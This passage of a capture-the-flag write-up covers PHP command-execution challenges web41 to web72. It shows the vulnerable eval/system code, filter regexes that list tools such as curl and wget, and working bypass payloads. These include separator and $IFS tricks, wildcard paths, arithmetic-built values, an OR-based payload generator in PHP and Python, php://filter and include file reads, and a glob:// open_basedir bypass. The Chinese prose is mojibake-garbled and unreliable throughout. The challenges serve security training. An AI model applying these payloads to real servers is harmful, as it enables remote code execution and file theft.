href="#web41-rce-or" class="headerlink" title="web41(rce_or)"></a>web41(rce_or)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo(<span class="token interpolation"><span class="token variable">$c</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>è¿‡æ»¤äº†<code>$ã€+ã€-ã€^ã€~</code>ä½¿å¾—<strong>å¼‚æˆ–è‡ªå¢å’Œå–å</strong>æ„é€ å­—ç¬¦éƒ½æ— æ³•ä½¿ç”¨ï¼ŒåŒæ—¶è¿‡æ»¤äº†å­—æ¯å’Œæ•°å­—ã€‚ä½†æ˜¯ç‰¹æ„ç•™äº†ä¸ª<code>|</code>è¿ç®—ç¬¦</p><p>æ ¹æ®æ­£åˆ™åŒ¹é…ç”Ÿæˆå¯ç”¨å­—ç¬¦çš„é›†åˆrce_or.php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>æ ¹æ®å¯ç”¨çš„å­—ç¬¦ç”ŸæˆPayload</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> os<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>   s1<span class="token operator">=</span><span class="token string">""</span>   s2<span class="token operator">=</span><span class="token string">""</span>   <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>       f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>       <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>           t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">if</span> t<span class="token operator">==</span><span class="token string">""</span><span class="token punctuation">:</span>               <span class="token keyword">break</span>           <span class="token keyword">if</span> t<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span>i<span class="token punctuation">:</span>               <span class="token comment">#print(i)</span>               s1<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">]</span>               s2<span class="token operator">+=</span>t<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>               <span class="token keyword">break</span>       f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>   output<span class="token operator">=</span><span class="token string">"(\""</span><span class="token operator">+</span>s1<span class="token operator">+</span><span class="token string">"\"|\""</span><span class="token operator">+</span>s2<span class="token operator">+</span><span class="token string">"\")"</span>   <span class="token keyword">return</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span>   <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>   param<span class="token operator">=</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n[+] your functionï¼š"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token operator">+</span>action<span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"[+] your commandï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[*] result:\n"</span><span class="token operator">+</span>param<span class="token punctuation">)</span></code></pre><p><img src="web41.png" loading="lazy"></p><h4 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>Payload:</p><blockquote><p>?c&#x3D;cat flag.php;  ?c&#x3D;cat flag.php||  ?c&#x3D;cat flag.php%26(&amp;)    c&#x3D;nl flag.php%0a  ?c&#x3D;echo <code>tac fl*</code>||</p><p>ä½¿ç”¨ â€œ ; â€œ â€œ || â€œ â€œ &amp; â€œ â€œ &amp;&amp; â€œ åˆ†éš”</p><p>&#x2F;dev&#x2F;null 2&gt;&amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° &#x2F;dev&#x2F;null å³ä¸å›æ˜¾<br>; åˆ†å·<br>| åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤<br>|| åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤<br>&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ<br>&amp;&amp; ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ</p></blockquote><h4 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h4><p>å¤šè¿‡æ»¤äº†cat,\å’Œï¼›ï¼Œä½¿ç”¨å…¶ä»–Payloadå³å¯</p><h4 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h4><p>å¤šè¿‡æ»¤äº†flagï¼Œä½¿ç”¨fla*å³å¯</p><h4 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h4><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½¿ç”¨$IFSæˆ–è€…%09ç»•è¿‡å³å¯</p><h4 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h4><p>è¿‡æ»¤äº†$å’Œ*ï¼ŒPayloadå¦‚ä¸‹ï¼š</p><blockquote><p>1ã€?c&#x3D;nl&lt;flaâ€™â€™g.php||</p><p>2ã€?c&#x3D;ca\t&lt;fl\ag.php||</p></blockquote><h4 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>Payload:</p><blockquote><p>tac%09flâ€™â€™ag.php||</p><p>â€¦â€¦.</p></blockquote><h4 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>å¤šè¿‡æ»¤äº†ä¸€äº›å‡½æ•°ï¼Œä¸è¿‡ä¹‹å‰Payloadå¯ä»¥ç»§ç»­æ‰“</p><h4 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†%ï¼Œä½†æ˜¯å¯ä»¥&lt;</p><h4 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>åŒä¸Š</p><h4 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>banäº†tacä½†æ˜¯å¯ä»¥ç”¨nl</p><h4 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h4><p>banäº†&lt;&gt;ï¼Œä½†æ˜¯å¯ä»¥ç”¨$IFS,è€Œä¸”è¿™æ¬¡flagæ”¾åœ¨äº†æ ¹ç›®å½•</p><p>Payload:</p><blockquote><p>?c&#x3D;nl$IFS&#x2F;flâ€™â€™ag||</p></blockquote><h4 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token operator">.</span><span class="token variable">$d</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'no'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€?c&#x3D;taâ€™â€™c${IFS}fâ€™â€™lag.php</p><p>2ã€sâ€™â€™ort${IFS}f???????%0a</p></blockquote><h4 id="web54"><a href="#web54" class="headerlink" title="web54"></a>web54</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€?c&#x3D;&#x2F;bin&#x2F;?at${IFS}f???????</p><p>2ã€mv flag.php t.txt</p></blockquote><h4 id="web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ"><a href="#web55-æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)"></a>web55(æ— æ•°å­—å­—æ¯çš„å‘½ä»¤æ‰§è¡Œ)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\>|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†æ‰€æœ‰å­—æ¯</p><p><img src="web55.png" loading="lazy"></p><p>åˆ©ç”¨postä¸Šä¼ æ–‡ä»¶ï¼Œç„¶åä½¿ç”¨.(source)æ‰§è¡Œï¼Œä¸€èˆ¬ä¸Šä¼ åæ–‡ä»¶åœ¨&#x2F;tmp&#x2F;php?????[@-[]</p><p><img src="web55_2.png" loading="lazy"></p><p>[å‚è€ƒæ–‡ç« ]: <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">https://blog.csdn.net/qq_46091464/article/details/108513145</a>â€œæ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œâ€</p><h4 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h4><p>æ–¹æ³•åŒä¸Š</p><h4 id="web57-å–å"><a href="#web57-å–å" class="headerlink" title="web57(å–å)"></a>web57(å–å)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//flag in 36.php </span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\&lt;|\.|\,|\?|\*|\-|\=|\[/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span></code></pre><p>è¿‡æ»¤äº†å­—æ¯æ•°å­—</p><p>é€šè¿‡<code>$(())</code>æ“ä½œæ„é€ å‡º36ï¼š <code>$(())</code> ï¼šä»£è¡¨åšä¸€æ¬¡è¿ç®—ï¼Œå› ä¸ºé‡Œé¢ä¸ºç©ºï¼Œä¹Ÿè¡¨ç¤ºå€¼ä¸º0</p><p><code>$(( ~$(()) )) </code>ï¼šå¯¹0ä½œå–åè¿ç®—ï¼Œå€¼ä¸º-1</p><p><code>$(( $((~$(()))) $((~$(()))) ))</code>ï¼š -1-1ï¼Œä¹Ÿå°±æ˜¯(-1)+(-1)ä¸º-2ï¼Œæ‰€ä»¥å€¼ä¸º-2</p><p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>ï¼šå†å¯¹-2åšä¸€æ¬¡å–åå¾—åˆ°1ï¼Œæ‰€ä»¥å€¼ä¸º1</p><p>æ•…æˆ‘ä»¬åœ¨<code>$(( ~$(( )) ))</code>é‡Œé¢æ”¾37ä¸ª<code>$((~$(())))</code>ï¼Œå¾—åˆ°-37ï¼Œå–åå³å¯å¾—åˆ°36</p><p>Payload:</p><blockquote><p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p></blockquote><h4 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Payload:</p><blockquote><p>1ã€c&#x3D;show_source(â€˜flag.phpâ€™);</p><p>2ã€c&#x3D;highlight_file(â€œflag.phpâ€);</p><p>3ã€c&#x3D;include($_POST[â€˜wâ€™]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>4ã€c&#x3D;include(â€œflag.phpâ€);var_dump(get_defined_vars());</p></blockquote><h4 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h4><p>PayloadåŒä¸Š</p><h4 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h4><p>PayloadåŒä¸Š</p><h4 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h4><p>PayloadåŒä¸Š</p><h4 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h4><p>PayloadåŒä¸Šï¼Œä¸è¿‡banäº†highlight_fileå‡½æ•°</p><h4 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h4><p>PayloadåŒä¸Š</p><h4 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h4><p>PayloadåŒä¸Š</p><h4 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h4><p>banäº†show_source,ç„¶åä½¿ç”¨phpä¼ªåè®®è¯»å–flag.phpæ—¶ï¼Œæºç æ˜¾ç¤ºflagä¸åœ¨è¿™ï¼Œäºæ˜¯ä½¿ç”¨dataåè®®è¯»å–æ ¹ç›®å½•çœ‹åˆ°flag.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="web65.png" loading="lazy"></p><p>å› ä¸ºå¤§éƒ¨åˆ†ç›´æ¥å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°è¢«banäº†ï¼Œçœ‹äº†wpæ²¡æƒ³åˆ°highlight_fileæ²¡è¢«ban</p><h4 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h4><p>PayloadåŒä¸Š</p><h4 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h4><p>highlight_fileè¢«banäº†ï¼Œä½†æ˜¯å¯ä»¥ç›´æ¥ç”¨phpä¼ªåè®®è¯»å–</p><h4 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h4><p>PayloadåŒä¸Š</p><p>implodeï¼šæŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²</p><p>å†·é—¨å‡½æ•°ï¼šè¯»å–å‡½æ•°readgzfileï¼šå¯ä»¥è¯»å–égzæ ¼å¼çš„æ–‡ä»¶</p><p>Payloadï¼š</p><blockquote><p>1ã€?c&#x3D;echo(implode(â€˜â€”â€˜,scandir(â€œ&#x2F;â€œ)));</p><p>2ã€?c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);</p></blockquote><h4 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h4><p>è™½ç„¶æœ‰å‡ ä¸ªæŠ¥é”™ä½†æ˜¯flagè¿˜æ˜¯å‡ºæ¥äº†</p><h4 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>è™½ç„¶phpä¼ªåè®®å¯ä»¥è¯»ï¼Œä½†æ˜¯ç»“æœæŠŠæ•°å­—å­—æ¯æ›¿æ¢äº†ï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œphpä»£ç è®©åé¢çš„åŒ¹é…ç¼“å†²åŒºä¸æ‰§è¡Œç›´æ¥é€€å‡ºexitæˆ–die</p><p>Payload:</p><blockquote><p>c&#x3D;readgzfile(â€˜&#x2F;flag.txtâ€™);exit(0);</p><p>c&#x3D;include(â€˜&#x2F;flag.txtâ€™);exit(0);</p></blockquote><h4 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h4><p>PayloadåŒä¸Š</p><h4 id="web72-globåè®®-wafç»•è¿‡"><a href="#web72-globåè®®-wafç»•è¿‡" class="headerlink" title="web72(globåè®®+wafç»•è¿‡)"></a>web72(globåè®®+wafç»•è¿‡)</h4><p>flagä¸åœ¨&#x2F;ä¸‹äº†ï¼Œä½†æ˜¯å¾ˆå¤šæŸ¥è¯¢çš„å‡½æ•°è¢«banäº†</p><p>ä½¿ç”¨glob:&#x2F;&#x2F;ä¼ªåè®®ç»•è¿‡open_basedir</p><p>globå¯ä»¥éå†ç›®å½•ï¼Œå¹¶ä¸”ä¸å—disable_functionsçš„é™åˆ¶ã€‚</p><pre class="language-php" data-language="php"><code class="language-php">c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob://./*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter 